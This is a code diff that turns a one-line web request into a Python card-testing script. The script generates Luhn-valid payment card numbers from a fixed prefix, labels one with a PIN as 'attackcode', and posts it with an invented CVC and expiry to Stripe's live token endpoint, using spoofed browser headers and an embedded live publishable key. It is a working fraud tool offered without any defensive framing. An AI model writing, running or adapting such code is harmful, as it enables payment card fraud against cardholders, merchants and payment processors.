@@ -1,4 +1,56 @@
 import requests
+from requests.structures import CaseInsensitiveDict
+import random
 
-r = requests.get("https://google.com")
-print(r.text)
+pin = "123"
+gcRange = "426370025942"
+def luhn_checksum(n):
+    digits = [int(_) for _ in str(n)]
+    odd_digits = digits[-1::-2]
+    even_digits = digits[-2::-2]
+    checksum = 0
+    checksum += sum(odd_digits)
+    for d in even_digits:
+        checksum += sum([int(_) for _ in str(d * 2)])
+    return checksum % 10
+
+
+def gen_card(base):
+    n = base + "".join(map(str, [random.randint(0, 9) for _ in range(3)]))
+    checksum = luhn_checksum(int(n) * 10)
+    card = n + str(checksum) if checksum == 0 else n + str(10 - checksum)
+    return card
+
+
+gc = gen_card(f"{gcRange}")
+#print(gc)  # print the card number
+attackcode = gc + ":" + pin
+print("Trying with ", attackcode)
+
+
+
+
+
+url = "https://api.stripe.com/v1/tokens"
+checkme = gc
+headers = CaseInsensitiveDict()
+headers["authority"] = "api.stripe.com"
+headers["accept"] = "application/json"
+headers["accept-language"] = "en-US,en;q=0.9"
+headers["content-type"] = "application/x-www-form-urlencoded"
+headers["origin"] = "https://js.stripe.com"
+headers["referer"] = "https://js.stripe.com/"
+headers["sec-ch-ua-mobile"] = "?0"
+headers["sec-fetch-dest"] = "empty"
+headers["sec-fetch-mode"] = "cors"
+headers["sec-fetch-site"] = "same-site"
+headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
+
+data = "card[number]=" + checkme + "&card[cvc]=344&card[exp_month]=02&card[exp_year]=30&card[address_zip]=L6L+6L9&guid=e0b5f9b1-47af-4dc6-ac9a-e8b32e78119158b928&muid=1e52e31b-dcc6-4d46-82bc-c8fb0ee487a86c6a61&sid=53879d98-079c-4b12-8e11-03030724873d4a3237&payment_user_agent=stripe.js%2F4eded062f%3B+stripe-js-v3%2F4eded062f&time_on_page=113506&key=pk_live_OdtlvfcvUQDLqgtkfTAy6lkT&pasted_fields=number%2Czip"
+
+
+resp = requests.post(url, headers=headers, data=data)
+
+print(resp.status_code)
+print(resp.text)
+print(resp.json())
